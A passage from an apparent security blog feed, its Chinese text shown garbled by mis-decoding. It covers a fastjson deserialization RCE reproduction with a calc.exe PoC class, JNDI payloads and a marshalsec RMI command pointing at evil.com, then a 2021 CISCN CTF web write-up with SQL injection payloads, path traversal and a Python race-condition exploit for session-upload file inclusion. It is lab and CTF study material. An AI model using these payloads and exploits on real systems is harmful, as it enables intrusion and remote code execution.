å‚æ—¶ï¼Œ@typeæŒ‡å®šäº†å½“å‰å­—ç¬¦ä¸²æŒ‰ç…§Pocç±»æ¥è§£æã€‚åœ¨Pocç±»ä¸­å†™äº†ä¸€ä¸ªæ— å‚æ„é€ æ–¹æ³•ã€getterå’Œsetteræ–¹æ³•ã€‚æ ¹æ®ç»“æœæ˜¾ç¤ºï¼Œåœ¨ååºåˆ—åŒ–æ—¶åŒæ—¶è°ƒç”¨äº†æ— å‚æ„é€ å‡½æ•°ä»¥åŠgetterå’Œsetteræ–¹æ³•ï¼Œsetteræ–¹æ³•ä¸­ä¸­é€šè¿‡execæ‰§è¡Œäº†å¤–éƒ¨å‘½ä»¤è®¡ç®—å™¨ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å¯¹äº <strong><code>fastjsonç‰ˆæœ¬ &lt;= 1.2.24</code></strong>çš„æƒ…å†µï¼Œåˆ©ç”¨æ€è·¯ä¸»è¦æœ‰2ç§</p><ul><li>é€šè¿‡è§¦å‘ç‚¹<strong><code>JSON.parseObject()</code></strong>è¿™ä¸ªå‡½æ•°ï¼Œå°†<strong><code>json</code></strong>ä¸­çš„ç±»è®¾ç½®æˆ<strong><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></strong>å¹¶é€šè¿‡ç‰¹æ„æ„é€ è¾¾åˆ°å‘½ä»¤æ‰§è¡Œ</li><li>é€šè¿‡<strong><code>JNDIæ³¨å…¥</code></strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.demo;</span><br><span class="line"></span><br><span class="line">~~~~<span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">poc</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        poc t = <span class="keyword">new</span> poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â‰¤1.2.24</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://localhost:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;name&quot;</span>:&#123;</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line"><span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;x1001&quot;</span>:&#123;</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line"><span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://localhost:9999/Exploit&quot;</span>,</span><br><span class="line"><span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>JDNI(â‰¤1.2.47)</p><h2 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h2><h3 id="å°†com-sun-rowset-JdbcRowSetImplå­˜å…¥-mappings-ä¸­"><a href="#å°†com-sun-rowset-JdbcRowSetImplå­˜å…¥-mappings-ä¸­" class="headerlink" title="å°†com.sun.rowset.JdbcRowSetImplå­˜å…¥ mappings ä¸­"></a>å°†com.sun.rowset.JdbcRowSetImplå­˜å…¥ mappings ä¸­</h3><p><code>DefaultJSONParser</code>â†’<code>checkAutoType</code>-&gt;<code>getClassFromMappingï¼ˆä¸ºnullï¼‰</code>-&gt; <code>deserializers.findClass(typeName)</code>,æ‰€ä»¥è¿”å›<code>java.lang.class</code>â†’é€šè¿‡ <code>config.getDeserializer</code> è·å¾—ååºåˆ—åŒ–çš„è·¯ç”±ç±» <code>MiscCodec</code>-&gt;è°ƒç”¨è¯¥è·¯ç”±ç±»çš„<code>deserialze(this, clazz, fieldName)</code>æ–¹æ³•â†’</p><p><code>parser.parse()</code>æå–<code>com.sun.rowset.JdbcRowSetImpl</code>èµ‹å€¼ç»™<code>objVal</code></p><p>â†’<code>TypeUtils.loadClass</code>-&gt;loadClassçš„é‡è½½æ–¹æ³•å°†<code>com.sun.rowset.JdbcRowSetImpl</code>å­˜å…¥checkAutoTypeçš„mappingsä¸­</p><h3 id="ç»•è¿‡å¹¶æ‰§è¡Œå®ç°RCE"><a href="#ç»•è¿‡å¹¶æ‰§è¡Œå®ç°RCE" class="headerlink" title="ç»•è¿‡å¹¶æ‰§è¡Œå®ç°RCE"></a>ç»•è¿‡å¹¶æ‰§è¡Œå®ç°RCE</h3><p>å‰é¢ä¸€æ ·ä¸è¿‡ä¼ å…¥çš„typenameæ˜¯com.sun.rowset.JdbcRowSetImplâ†’<code>checkAutoType</code>-&gt;ç”±äºç¬¬ä¸€æ¬¡è§£æä¸­å°†<code>com.sun.rowset.JdbcRowSetImpl</code>å­˜å…¥ <code>mappings</code> ä¸­é€šè¿‡<code>TypeUtils.getClassFromMapping(typeName)</code>;è·å–åˆ° <code>com.sun.rowset.JdbcRowSetImpl</code> å¯¹è±¡ç„¶åè¿”å›è¯¥å¯¹è±¡ï¼ˆå®Œæˆç»•è¿‡)â†’è°ƒç”¨<code>deserializer.deserialze(this, clazz, fieldName)</code>ï¼Œä¸åŒçš„æ˜¯è¿™æ¬¡å¾—åˆ°çš„ååºåˆ—åŒ–è·¯ç”±ç±»ä¸º<code>FastjsonASMDeserializer</code>ã€‚â†’<code>deserialze</code>æ–¹æ³•â†’åœ¨<code>setValue</code>ä¸­é€šè¿‡<code>method.invoke(object, value)</code>åå°„æ‰§è¡Œ<code>com.sun.rowset.JdbcRowSetImpl.setAutoCommit</code>æ–¹æ³•</p><h3 id="JdbcRowSetImplåˆ©ç”¨é“¾"><a href="#JdbcRowSetImplåˆ©ç”¨é“¾" class="headerlink" title="JdbcRowSetImplåˆ©ç”¨é“¾"></a>JdbcRowSetImplåˆ©ç”¨é“¾</h3><p>è·Ÿè¿›<code>setAutoCommit</code>ä¸­çš„<code>this.connect()</code>æ–¹æ³•</p><p><code>this.connect</code>å¯¹æˆå‘˜å˜é‡<code>dataSourceName</code>è¿›è¡Œ<code>lookup</code>ï¼ŒæˆåŠŸåˆ©ç”¨jndiæ³¨å…¥</p><p>åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Exec:<span class="number">620</span>,Runtime <span class="comment">//å‘½ä»¤æ‰§è¡ŒLookup:417,InitalContext  </span></span><br><span class="line"><span class="comment">//jndi </span></span><br><span class="line">lookupå‡½æ•°é€šè¿‡rmiåŠ è½½æ¶æ„ç±»setAutoCommit:<span class="number">4067</span>,JdbcRowSetImpl <span class="comment">//é€šè¿‡setAutoCommitè§¦å‘lookupå‡½æ•°setValue:96,</span></span><br><span class="line">FieldDeserializer <span class="comment">//åå°„è°ƒç”¨ä¼ å…¥ç±»çš„setå‡½æ•°deserialze:600, </span></span><br><span class="line">JavaBeanDeserializer <span class="comment">//é€šè¿‡å¾ªç¯è°ƒç”¨ä¼ å…¥ç±» </span></span><br><span class="line">set,get,iså‡½æ•°parseObject:<span class="number">368</span>,DefaultJSONParser <span class="comment">//è§£æä¼ å…¥çš„jsonå­—ç¬¦ä¸²</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p>æ–‡ç« å†…ç¯å¢ƒé…ç½®å®Œå…¨çœç•¥ï¼Œè¯·è‡ªè¡Œå¯»æ‰¾ç¯å¢ƒé…ç½®æ•™ç¨‹</p><p>å¤ç°é’ˆå¯¹1.2.47çš„ååºåˆ—åŒ–æ¼æ´ï¼Œé‡‡ç”¨JDNIæ³¨å…¥çš„æ–¹å¼</p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><ul><li>docker</li><li>docker-compose</li><li>vulhub</li><li>win10</li><li>Ubuntu18.04 VPS</li><li>java1.8</li><li>python3.7</li><li>marshalsec</li><li>burpsuite</li></ul><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><p>ä¸»è¦æ˜¯ç”¨python3èµ·çš„httpç›®å½•æœåŠ¡å’Œmarshalsecèµ·çš„rmiæœåŠ¡ï¼Œé¶æœºåˆ™æ˜¯ç”¨çš„vulhub+docker-compose</p><h3 id="é¶æœº"><a href="#é¶æœº" class="headerlink" title="é¶æœº"></a>é¶æœº</h3><p><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p><p>ä½¿ç”¨vulhubçš„dockeræ–‡ä»¶</p><p>ç›®å½•ä¸ºvulhub/fastjson/1.2.47-rce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>dockerå’Œdocker-composeä»¥åŠç›¸å…³ä½¿ç”¨è¯·è‡ªè¡Œå­¦ä¹ </p><h3 id="ç›®å½•æœåŠ¡"><a href="#ç›®å½•æœåŠ¡" class="headerlink" title="ç›®å½•æœåŠ¡"></a>ç›®å½•æœåŠ¡</h3><p>é¦–å…ˆå‡†å¤‡ä¸€ä¸ªjavaæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”ç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æ¶æ„ç±»çš„ç›®å½•ä¸‹ç”¨pythonèµ·ä¸€ä¸ªhttpæœåŠ¡ï¼ˆæ³¨æ„è¿™é‡Œä½¿ç”¨çš„pythonæ˜¯3.7ï¼Œpython2è¯­æ³•ä¸åŒè¯·è‡ªè¡Œç™¾åº¦ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 33333//ç«¯å£çœ‹ä½ ä¸ªäººå–œæ¬¢</span><br></pre></td></tr></table></figure><h3 id="å‡†å¤‡RMIæœåŠ¡å™¨"><a href="#å‡†å¤‡RMIæœåŠ¡å™¨" class="headerlink" title="å‡†å¤‡RMIæœåŠ¡å™¨"></a>å‡†å¤‡RMIæœåŠ¡å™¨</h3><p><a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p>å€ŸåŠ©marshalsecé¡¹ç›®ï¼Œå¯åŠ¨ä¸€ä¸ªRMIé¡¹ç›®ï¼Œç„¶åç¼–è¯‘é¡¹ç›®ï¼Œç„¶ååœ¨targetä¸‹è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://evil.com/#TouchFile&quot;</span> 9999</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¯åŠ¨RMIæœåŠ¡</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021fastjson1.png" alt=""></p><h2 id="result"><a href="#result" class="headerlink" title="result"></a>result</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it å®¹å™¨å· bash //è¿›å…¥å®¹å™¨</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br></pre></td></tr></table></figure><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021fastjson2.png" alt=""></p><p>æœ‰seccessï¼Œæ¼æ´åˆ©ç”¨æˆåŠŸ</p><p>exité€€å‡ºå®¹å™¨ downæ‰dockerï¼Œå¤ç°ç»“æŸ</p>]]></content>
    
    
    <summary type="html">å¯¹äºfastjsonååºåˆ—åŒ–æ¼æ´çš„åˆ†æå’Œå¯¹äºæœ€æ–°çš„1.2.47ç‰ˆæœ¬çš„JNDIæ³¨å…¥ç»•è¿‡çš„å¤ç°</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="http://www.fxizenta.design/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="fastjson" scheme="http://www.fxizenta.design/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/fastjson/"/>
    
    
    <category term="ååºåˆ—åŒ–" scheme="http://www.fxizenta.design/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="RCE" scheme="http://www.fxizenta.design/tags/RCE/"/>
    
    <category term="JNDIæ³¨å…¥" scheme="http://www.fxizenta.design/tags/JNDI%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2021ciscn_web_wp</title>
    <link href="http://www.fxizenta.design/2021/05/18/ciscn2021/"/>
    <id>http://www.fxizenta.design/2021/05/18/ciscn2021/</id>
    <published>2021-05-18T01:07:07.000Z</published>
    <updated>2021-07-23T09:05:40.368Z</updated>
    
    <content type="html"><![CDATA[<p>å…ˆæ”¾ä¸Šæ¯”èµ›æ—¶è§£å‡ºçš„é¢˜ï¼Œå‰©ä¸‹çš„é¢˜ç›®ç­‰wpä¹‹åå†æ…¢æ…¢å¤ç°å§</p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>æŠ¥é”™æ³¨å…¥</p><p>information_schema sys å…¨è¢«è¿‡æ»¤</p><p>å‚è€ƒ<a href="https://blog.csdn.net/weixin_35867608/article/details/113937118">mysql æ³¨å…¥ information<em>schema</em>ç»•è¿‡IDSè¿‡æ»¤information<em>schemaç»§ç»­æ³¨å…¥</em>å®‡æ–‡æ•°å­¦çš„åšå®¢-CSDNåšå®¢</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;)and(select extractvalue(1,concat(0x7e,(select * from users where id&#x3D;1 and Polygon(id)))))%23</span><br></pre></td></tr></table></figure><p>å‡ºsecurity<code>.</code>users<code>.</code>id çŸ¥é“åº“åï¼Œä¸€ä¸ªè¡¨åå’Œä¸€ä¸ªåˆ—</p><p>ä¹‹åçˆ†useré™¤äº†idä»¥ä¸ºçš„åˆ—åï¼Œç„¶åçœ‹userè¡¨å‘ç°æ²¡æœ‰æœ‰ç”¨çš„ä¸œè¥¿</p><p>ç›²çŒœåº”è¯¥æ˜¯åœ¨å…¶ä»–è¡¨é‡Œï¼Œéšä¾¿è¯•äº†ä¸ªflagï¼Œå‘ç°çœŸçš„æœ‰è¿™ä¸ªè¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select extractvalue(1,concat(0x7e,(select * from(select * from flag a join flag b)c))))</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯åŠ ä¸Šusingæµ‹å…¶ä»–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select extractvalue(1,concat(0x7e,(select * from(select * from flag a join flag b using(id))c))))</span><br></pre></td></tr></table></figure><p>æµ‹å‡ºflagæœ‰<code>625b4d5d-a34a-4843-8e09-70e91ef003a9</code>å­—æ®µï¼Œä¸€çœ‹å°±å¾ˆä¸æ­£å¸¸ï¼Œè¯»ä¸€ä¸‹å‘ç°æ˜¯flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select extractvalue(1,concat(0x7e,(select group_concat(&#96;625b4d5d-a34a-4843-8e09-70e91ef003a9&#96;) from flag))))</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¾ç¤ºä¸å…¨</p><p>ç”¨rightçœ‹æ²¡æ˜¾ç¤ºå…¨çš„éƒ¨åˆ†</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/202120210518085929.png" alt=""></p><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>åŸé¢˜</p><p><a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>payloadï¼š?rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/202120210518085810.png" alt=""></p><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>çœ‹../../../../../../../../etc/apache2/envvarså‘ç°æœ‰ä¸ªPHP_SESSION_UPLOAD_PROGRESS</p><p>æ‰«ç›®å½•å‘ç°æœ‰ä¸ª.listing</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/202120210518085737.png" alt=""></p><p>è®¿é—®/.listing å‘ç°æœ‰ä¸ªyou_can_seeeeeeee_me.phpï¼Œè®¿é—®å‘ç°æ˜¯ä¸ªphpinfo()</p><p>åŸºæœ¬ç¡®è®¤æ˜¯PHP_SESSION_UPLOAD_PROGRESSçš„æœ¬åœ°åŒ…å«</p><p>ç„¶åå‚è€ƒ<a href="https://blog.csdn.net/mochu7777777/article/details/116499336çš„è„šæœ¬åŠ ä¸Šæ¡ä»¶ç«äº‰">https://blog.csdn.net/mochu7777777/article/details/116499336çš„è„šæœ¬åŠ ä¸Šæ¡ä»¶ç«äº‰</a></p><p>sessçš„ç›®å½•å¯ä»¥åœ¨phpinfoä¸­æ‰¾åˆ°æ˜¯/var/lib/php/sessions/dhbiedjbgc/</p><p>ç„¶åå°±æ˜¯ä»/etc/å¼€å§‹æ‰¾èµ·æ‰¾ä¸€ä¸‹å¥‡æ€ªå­—ç¬¦ä¸²ç»„æˆçš„ç›®å½•ï¼Œç¬¬ä¸€ä¸ªç›®å½•æ¯”è¾ƒéš¾æ‰¾å…¶ä»–å°±ç›®å½•ä¸‹å°±ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä¸€ç›´æ‰¾ä¸‹å»ç›´åˆ°å‘ç°fl444444g</p><p>æœ€åè¯»ä¸€ä¸‹/etc/dbeicagidd/eeaefabfif/bfcaciaahd/cbbfaadhee/efbibeigci/fl444444g</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://124.71.225.249:23817/&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;abcd&#x27;</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">mydata = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php $c = scandir(&quot;/etc/dbeicagidd/eeaefabfif/bfcaciaahd/cbbfaadhee/efbibeigci/fl444444g&quot;);var_dump($c);?&gt;&#x27;</span>,<span class="string">&quot;field&quot;</span>:<span class="string">&quot;abcababab&quot;</span>,<span class="string">&quot;cf&quot;</span>:<span class="string">&quot;../../../../../../../../var/lib/php/sessions/dhbiedjbgc/sess_&quot;</span>+sessid&#125;</span><br><span class="line">myfile=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;abcd.txt&#x27;</span>,f)&#125;</span><br><span class="line">mycookie=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = session.post(url, data=mydata, files=myfile, cookies=mycookie )</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(res.text) != <span class="number">2037</span>):</span><br><span class="line">            print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å…ˆæ”¾ä¸Šæ¯”èµ›æ—¶è§£å‡ºçš„é¢˜ï¼Œå‰©ä¸‹çš„é¢˜ç›®ç­‰wpä¹‹åå†æ…¢æ…¢å¤ç°å§&lt;/p&gt;
&lt;h2 id=&quot;easy-sql&quot;&gt;&lt;a href=&quot;#easy-sql&quot; class=&quot;headerlink&quot; title=&quot;easy_sql&quot;&gt;&lt;/a&gt;easy_sql&lt;/h2&gt;&lt;p&gt;æŠ¥é”™æ³¨å…¥&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="ctf" scheme="http://www.fxizenta.design/categories/ctf/"/>
    
    <category term="web" scheme="http://www.fxizenta.design/categories/ctf/web/"/>
    
    
    <category term="wp" scheme="http://www.fxizenta.design/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>åŒæºç­–ç•¥å’ŒCOTRS</title>
    <link href="http://www.fxizenta.design/2021/05/06/same_source_and_cors/"/>
    <id>http://www.fxizenta.design/2021/05/06/same_source_and_cors/</id>
    <published>2021-05-06T12:07:07.000Z</published>
    <updated>2021-07-23T09:09:15.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŒæºç­–ç•¥å’ŒCORS"><a href="#åŒæºç­–ç•¥å’ŒCORS" class="headerlink" title="åŒæºç­–ç•¥å’ŒCORS"></a>åŒæºç­–ç•¥å’ŒCORS</h1><h1 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h1><p>åŒæºç­–ç•¥æ˜¯ä¸€ç§å®‰å…¨ç­–ç•¥ï¼Œç”¨äºé™åˆ¶originçš„æ–‡æ¡£æˆ–è€…æ–‡æ¡£æ‰€åŠ è½½çš„è„šæœ¬å¦‚ä½•åŒå¦å¤–ä¸€ä¸ªæºè¿›è¡Œäº¤äº’ï¼Œç”¨äºå¸®åŠ©é˜»éš”æ¶æ„æ–‡æ¡£ï¼Œå‡å°‘å¯èƒ½è¢«æ”»å‡»çš„åª’ä»‹ã€‚</p><h2 id="åŒæºçš„å®šä¹‰"><a href="#åŒæºçš„å®šä¹‰" class="headerlink" title="åŒæºçš„å®šä¹‰"></a>åŒæºçš„å®šä¹‰</h2><p>è¿™ä¸ªæ–¹æ¡ˆä¹Ÿè¢«ç§°ä¸ºâ€œåè®®/ä¸»æœº/ç«¯å£å…ƒç»„â€ </p><p>ä¾‹å¦‚</p><p><a href="http://store.company.com/dir/page.html">http://store.company.com/dir/page.html</a> çš„æºè¿›è¡Œå¯¹æ¯”çš„ç¤ºä¾‹:</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/202120210506203252.png" alt=""></p><h2 id="æºçš„ç»§æ‰¿"><a href="#æºçš„ç»§æ‰¿" class="headerlink" 